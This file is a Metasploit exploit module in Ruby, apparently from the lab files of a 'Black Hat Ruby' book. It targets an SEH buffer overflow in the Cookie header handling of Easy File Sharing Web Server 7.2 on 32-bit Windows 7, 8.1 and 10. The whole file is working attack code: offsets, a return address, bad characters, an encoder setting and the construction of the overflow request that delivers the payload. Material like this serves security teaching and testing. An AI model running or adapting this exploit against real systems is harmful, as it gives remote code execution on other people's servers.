# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
# 
# Author: 
#   Sabri Hassanyah | @KINGSABRI
# Description: 
#   Metasploit Exploit Module for 'Easy File Sharing Web Server'
# Requirements: 
#   Metasploit framework 
# 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Easy File Sharing HTTP Server 7.2 SEH Overflow - vfolder(Cookie) funtion",
      'Description'    => %q{
        This module exploits a SEH overflow in the Easy File Sharing FTP Server 7.2 in /vfolder.ghp function, in the Cookies.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Sabri Hassanyah (@KINGSABRI) <King.Sabri[at]gmail.com>' ],
      'References'     =>
        [
          [
            ['EDB', '39008'],
            ['PACKETSTORM', '143382'],
            ['URL', 'http://www.sharing-file.com']
          ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Easy File Sharing 7.2 | Windows 10 32-bit',
            {
              'Offset' => 2000,
              'Ret'    => 0x100195f2 # pop pop ret @ 0x100195f2 : ImageLoad.dll
            }
          ],
          [ 'Easy File Sharing 7.2 | Windows 8.1 32-bit',
            {
              'Offset' => 2000,
              'Ret'    => 0x100195f2 # pop pop ret @ 0x100195f2 : ImageLoad.dll
            }
          ],
          [ 'Easy File Sharing 7.2 | Windows 7-SP1 32-bit',
            {
              'Offset' => 2000,
              'Ret'    => 0x100195f2 # pop pop ret @ 0x100195f2 : ImageLoad.dll
            }
          ]
        ],
      'Payload'        =>
        {
          'DisableNops' => true,
          'BadChars'    => "\x00\x3d"
        },
      'DisclosureDate' => "Jul 16 2017",
      'DefaultTarget'  => 0,
      'DefaultOptions' => {
        'RPORT'    => 80,
        'EXITFUNC' => 'thread',
        'ENCODER'  => 'x86/alpha_mixed',
        'DynamicSehRecord' => true
      }))
  end

  def build_request(sploit)
    req =  "GET /vfolder.ghp HTTP/1.1\r\n"
    req << "Host: " + datastore['rhost'] + "\r\n"
    req << "Cookie: SESSIONID=9999; UserID=PassWD=" + sploit + "; frmUserName=; frmUserPass=;\r\n"
    req << "Connection: keep-alive\r\n\r\n"
  end

  def exploit
    connect
    print_status("Sending exploit...")

    junk   = rand_text_alpha_upper(57)
    seh    = generate_seh_record(target.ret, 'Space' => 0x0a)
    nops   = make_nops(20)
    shell  = payload.encoded
    rest   = rand_text_alpha_upper(target['Offset'] - (junk + seh + nops + payload.encoded).length)
    sploit = junk + seh + nops + shell + rest
    sock.put(build_request(sploit))

    print_good("Exploit Sent")
    handler
    disconnect
  end

end
